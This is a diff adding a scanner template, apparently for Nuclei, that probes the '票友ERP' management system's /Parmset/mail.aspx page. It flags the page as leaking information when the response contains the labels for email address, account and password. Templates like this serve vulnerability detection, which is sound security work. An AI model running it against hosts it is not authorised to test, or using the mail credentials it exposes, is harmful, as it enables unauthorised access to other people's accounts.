@@ -1,0 +1,25 @@
+id: piaoyouERP-mail-info
+
+info:
+  name: 票友ERP管理系统 mail.aspx 信息泄露漏洞
+  author: piaoyouERP
+  severity: medium
+  tags: piaoyouERP
+  
+http:
+  - raw:
+      - |+
+        GET /Parmset/mail.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '邮箱地址'
+          - '邮箱帐号'
+          - '邮箱密码'
+        condition: and
